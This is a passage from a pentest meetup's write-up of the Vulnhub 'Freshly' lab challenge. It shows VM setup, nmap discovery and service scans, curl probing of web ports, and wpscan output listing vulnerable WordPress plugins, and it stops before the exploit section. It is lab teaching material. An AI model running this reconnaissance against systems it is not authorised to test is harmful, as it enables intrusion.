

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.18. Freshly &mdash; South Bay WASP 1.0.2 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.19. ZorZ" href="zorz.html"/>
        <link rel="prev" title="3.17. Holynix1" href="holynix1.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.18. Freshly</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.18.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.18.1.1. Setting up the VMware VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.18.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#directory-setup">3.18.2.1. Directory setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#basic-network-reconnaisance">3.18.2.2. Basic network reconnaisance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#what-s-at-ports-80-443-8080">3.18.2.3. What’s at ports 80, 443, 8080?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wpscan">3.18.2.4. <strong class="program">wpscan</strong></a></li>
<li class="toctree-l4"><a class="reference internal" href="#spidering-the-web-site">3.18.2.5. Spidering the web site</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sqlmap-login-php">3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal"><span class="pre">login.php</span></code></a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.18.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#insert-php-plugin">3.18.3.1. Insert PHP Plugin</a></li>
<li class="toctree-l4"><a class="reference internal" href="#create-your-own-wordpress-plugin">3.18.3.2. Create your own WordPress plugin</a></li>
<li class="toctree-l4"><a class="reference internal" href="#put-php-in-footer-php">3.18.3.3. Put php in footer.php</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-a-reverse-shell-and-root">3.18.3.4. Getting a reverse shell and root</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.18. Freshly</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/freshly.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="freshly">
<span id="id1"></span><h1>3.18. Freshly<a class="headerlink" href="#freshly" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.18.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">Vulnhub TopHatSec: Freshly</a>:</p>
<blockquote>
<div><p>The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file.</p>
<p>VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a class="reference external" href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/</a>.</p>
</div></blockquote>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.18.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/tophatsec/Freshly.ova">Freshly.ova</a>, which is a tar archive containing a VMware vmdk file.</p>
<p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Freshly is Ubuntu 14.04, x86, and 1024MB memory. For KVM you can use a backing store to undo any changes to the disk:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>Freshly
<span class="nv">BACKING</span><span class="o">=</span><span class="nv">$VM</span>-disk1.vmdk
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
curl --remote-name http://download.vulnhub.com/tophatsec/Freshly.ova
tar -xvf Freshly.ova
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the Freshly VM. The actual command the author used in Debian Linux to create the VM was (os-variant=ubuntutrusty was not supported on Debian Jessie at this time):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>Freshly
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">1024</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1">#    --console pty,target_type=virtio \</span>
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>So if Freshly were running and you wanted to “start over again”:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;Freshly&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.18.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="directory-setup">
<h3>3.18.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
<p>We’ll refer to the following directories below:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/local/pentest
<span class="nv">LOCATION</span><span class="o">=</span><span class="nv">$BASE</span>/phouse
<span class="nv">JOB</span><span class="o">=</span><span class="nv">$LOCATION</span>/freshly
<span class="nv">TOOLS</span><span class="o">=</span>exploit,dirb,hashcat,nikto,nmap,skipfish,sqlmap,wpscan
<span class="nb">eval</span> mkdir -p <span class="nv">$JOB</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
</pre></div>
</div>
</div>
<div class="section" id="basic-network-reconnaisance">
<h3>3.18.2.2. Basic network reconnaisance<a class="headerlink" href="#basic-network-reconnaisance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaisance looking for the vulnerable host:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nb">cd</span> <span class="nv">$JOB</span>/nmap
<span class="nv">NMOUT</span><span class="o">=</span>nmap-phouse
<span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="go">Warning:  You are not root -- using TCP pingscan rather than ICMP</span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-02 16:01 PDT</span>
<span class="go">Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan</span>
<span class="go">Ping Scan Timing: About 2.15% done; ETC: 16:02 (0:00:46 remaining)</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00029s latency).</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap done: 256 IP addresses (6 hosts up) scanned in 1.24 seconds</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$ #</span> use the grep-able output to get a list of target hosts
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$ #</span> use the xml output to get an html report
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>At this point we have $TARGETS so scan them:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$</span> nmap -A -vv -T5 --max-retries <span class="m">0</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Discovered open port 8080/tcp on 192.168.1.103</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Discovered open port 80/tcp on 192.168.1.103</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Discovered open port 443/tcp on 192.168.1.103</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00043s latency).</span>
<span class="go">Scanned at 2015-05-02 16:03:42 PDT for 70s</span>
<span class="go">Not shown: 997 closed ports</span>
<span class="go">PORT     STATE SERVICE  VERSION</span>
<span class="hll"><span class="go">80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))</span>
</span><span class="go">|_http-methods: GET HEAD POST OPTIONS</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
<span class="hll"><span class="go">443/tcp  open  ssl/http Apache httpd</span>
</span><span class="go">|_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A</span>
<span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
<span class="go">| ssl-cert: Subject: commonName=www.example.com</span>
<span class="go">| Issuer: commonName=www.example.com</span>
<span class="go">| Public Key type: rsa</span>
<span class="go">| Public Key bits: 1024</span>
<span class="go">| Not valid before: 2015-02-17T03:30:05+00:00</span>
<span class="go">| Not valid after:  2025-02-14T03:30:05+00:00</span>
<span class="go">| MD5:   ebd4 a980 6e51 1b13 769e d4b1 28f9 71dd</span>
<span class="go">| SHA-1: 6297 03e9 f83b 06e7 d50d 3f4b 5bae 38c9 7665 cc64</span>
<span class="go">| -----BEGIN CERTIFICATE-----</span>
<span class="go">| MIIBqzCCARQCCQDg5heFLm8t8jANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93</span>
<span class="go">| d3cuZXhhbXBsZS5jb20wHhcNMTUwMjE3MDMzMDA1WhcNMjUwMjE0MDMzMDA1WjAa</span>
<span class="go">| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A</span>
<span class="go">| MIGJAoGBANFjfgmsBCGKWfdqCYZnY2mKvtUnYFtenVjtqdReduE12yavSQZuWAi2</span>
<span class="go">| jIpCUMwG7RG3QAwyzCoMWAzF/tZimI8uNL8G9m84l/wQAbTPMPJTgJXpwY0/9IRc</span>
<span class="go">| hdqtpFoVS251qA9AvPeqMv/hV+rKVAkYcONB6Q8Or8S6ifkEBAZbAgMBAAEwDQYJ</span>
<span class="go">| KoZIhvcNAQEFBQADgYEAQ3Kt0nVDLMkAv9/k1bt6KaM06cvTtiekgu0ugxA0TNXC</span>
<span class="go">| FNIBqu/Fasog43FRLuUtAtNCNMqI5QAAVPatQPk1QmVoE+IxbvxldrKykZk9oXkj</span>
<span class="go">| 5rbE43BAkxyiMvuNsZh7W2Lzx14tlA84c8B4Y1S0CqoVLpaJaCQ5MtVMSya3wAM=</span>
<span class="go">|_-----END CERTIFICATE-----</span>
<span class="go">|_ssl-date: 2057-02-26T05:39:31+00:00; +41y299d6h34m41s from local time.</span>
<span class="hll"><span class="go">8080/tcp open  http     Apache httpd</span>
</span><span class="go">|_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A</span>
<span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 200)</span>
<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Our target freshly is T=192.168.1.103 and runs a web server at ports 80, 443, and 8080.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
</pre></div>
</div>
</div>
<div class="section" id="what-s-at-ports-80-443-8080">
<h3>3.18.2.3. What’s at ports 80, 443, 8080?<a class="headerlink" href="#what-s-at-ports-80-443-8080" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
curl --output freshly_80.txt http://<span class="nv">$T</span>/
cat freshly_80.txt
curl --insecure --output freshly_443.txt https://<span class="nv">$T</span>/
cat freshly_443.txt
curl --output freshly_8080.txt http://<span class="nv">$T</span>:8080/
cat freshly_8080.txt
</pre></div>
</div>
<p>When looking at the resulting content we see port 80 shows an image while 443 &amp; 8080 provide links to <a class="reference external" href="http://$T:8080/wordpress/">http://$T:8080/wordpress/</a> which is a wordpress-based site.</p>
</div>
<div class="section" id="wpscan">
<h3>3.18.2.4. <strong class="program">wpscan</strong><a class="headerlink" href="#wpscan" title="Permalink to this headline">¶</a></h3>
<p>Using the wordpress hint we run the <strong class="program">wpscan</strong> tool. It turns out not to be needed for the exploit so if you’re in a rush skip this section.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/wpscan
<span class="nv">$SUDO</span> apt-get install wpscan -y
<span class="nv">$SUDO</span> wpscan --url http://<span class="nv">$T</span>:8080/wordpress/ --random-agent <span class="se">\</span>
   --enumerate u,vp,vt,tt <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee wpscan.txt
</pre></div>
</div>
<p>The wpscan output gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/wpscan$ $</span>SUDO wpscan --url http://<span class="nv">$T</span>:8080/wordpress/ --random-agent <span class="se">\</span>
</span><span class="hll">&gt;    --enumerate u,vp,vt,tt <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tee wpscan.txt
</span><span class="go">_______________________________________________________________</span>
<span class="go">        __          _______   _____</span>
<span class="go">        \ \        / /  __ \ / ____|</span>
<span class="go">         \ \  /\  / /| |__) | (___   ___  __ _ _ __</span>
<span class="go">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \</span>
<span class="go">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
<span class="go">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>

<span class="go">        WordPress Security Scanner by the WPScan Team</span>
<span class="go">                       Version 2.7</span>
<span class="go">          Sponsored by Sucuri - https://sucuri.net</span>
<span class="go">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
<span class="go">_______________________________________________________________</span>

<span class="go">[+] URL: http://192.168.1.103:8080/wordpress/</span>
<span class="go">[+] Started: Tue May 12 23:10:27 2015</span>

<span class="go">[!] The WordPress &#39;http://192.168.1.103:8080/wordpress/readme.html&#39; file exists exposing a version number</span>
<span class="go">[!] Full Path Disclosure (FPD) in: &#39;http://192.168.1.103:8080/wordpress/wp-includes/rss-functions.php&#39;</span>
<span class="go">[+] Interesting header: SERVER: Apache</span>
<span class="go">[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN</span>
<span class="hll"><span class="go">[+] XML-RPC Interface available under: http://192.168.1.103:8080/wordpress/xmlrpc.php</span>
</span><span class="hll"><span class="go">[i] This may allow the GHOST vulnerability to be exploited, please see: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
</span>
<span class="hll"><span class="go">[+] WordPress version 4.1.5 identified from meta generator</span>
</span>
<span class="go">[+] Enumerating installed plugins (only vulnerable ones) ...</span>



<span class="go">  : |==========================================================================|</span>

<span class="hll"><span class="go">[+] We found 7 plugins:</span>
</span>
<span class="go">[+] Name: all-in-one-seo-pack - v2.2.5.1</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt</span>

<span class="go">[!] Title: All in One SEO Pack &lt;= 2.2.5.1 - Authentication Bypass</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7881</span>
<span class="go">    Reference: http://jvn.jp/en/jp/JVN75615300/index.html</span>
<span class="go">    Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/</span>
<span class="go">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902</span>
<span class="go">[i] Fixed in: 2.2.6</span>

<span class="go">[+] Name: all-in-one-wp-migration - v2.0.4</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-wp-migration/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-wp-migration/readme.txt</span>

<span class="go">[!] Title: All-in-One WP Migration &lt;= 2.0.4 - Unauthenticated Database Export</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7857</span>
<span class="go">    Reference: http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability</span>
<span class="go">[i] Fixed in: 2.0.5</span>

<span class="go">[+] Name: cart66-lite - v1.5.3</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/cart66-lite/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt</span>

<span class="go">[!] Title: Cart66 Lite &lt;= 1.5.3 - SQL Injection</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7737</span>
<span class="go">    Reference: https://research.g0blin.co.uk/g0blin-00022/</span>
<span class="go">    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442</span>
<span class="go">[i] Fixed in: 1.5.4</span>

<span class="go">[+] Name: google-analytics-for-wordpress - v5.3.1</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt</span>

<span class="go">[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7838</span>
<span class="go">    Reference: http://packetstormsecurity.com/files/130716/</span>
<span class="go">    Reference: http://osvdb.org/119334</span>
<span class="go">[i] Fixed in: 5.3.3</span>

<span class="go">[!] Title: Google Analytics by Yoast &lt;= 5.3.2 - Stored Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7856</span>
<span class="go">    Reference: https://yoast.com/ga-plugin-security-update-more/</span>
<span class="go">    Reference: http://klikki.fi/adv/yoast_analytics.html</span>
<span class="go">    Reference: http://packetstormsecurity.com/files/130935/</span>
<span class="go">    Reference: http://osvdb.org/119810</span>
<span class="go">[i] Fixed in: 5.3.3</span>

<span class="go">[!] Title: Google Analytics by Yoast &lt;= 5.3.3 - Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7914</span>
<span class="go">    Reference: https://yoast.com/coordinated-security-release/</span>
<span class="go">    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</span>
